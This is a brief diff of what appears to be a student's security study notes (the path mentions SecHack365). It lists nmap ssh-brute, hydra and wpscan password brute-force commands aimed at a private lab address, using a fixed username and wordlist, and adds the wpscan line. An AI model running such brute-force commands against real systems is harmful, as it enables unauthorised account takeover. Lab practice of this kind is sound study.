@@ -2,3 +2,5 @@ nmap -p 22 --script ssh-brute --script-args user=banban, passdb=lower.txt" --scr
 nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s --script-args unpwdb.timelimit=1m 10.37.129.8
 
  hydra -l banban -P /Users/ban/study/SecHack365/log_viewer_node/ver2/lower.txt 10.37.129.8 ssh
+
+wpscan --url http://10.37.129.8 --wordlist shellscript/lower.txt --threads 10 --username banban
